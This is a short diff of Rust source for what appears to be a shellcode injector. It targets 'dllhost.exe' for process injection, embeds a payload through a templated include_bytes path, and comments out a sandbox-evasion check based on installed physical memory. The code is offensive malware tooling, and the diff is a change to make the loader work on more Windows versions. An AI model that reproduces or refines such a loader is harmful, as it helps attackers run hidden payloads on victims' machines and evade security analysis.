@@ -85,6 +85,8 @@ fn main() {
     // inject in the following processes:
     let tar: &str = "dllhost.exe";
 
+    // Removing the sandobox check for now, as it fails on numerous Windows versions.
+    /*
     let mut memory = 0;
     unsafe {
         let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
@@ -93,7 +95,7 @@ fn main() {
             panic!("Hello.")
         }
     }
-
+    */
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
     let mut vec: Vec<u8> = Vec::new();
     for i in buf.iter() {
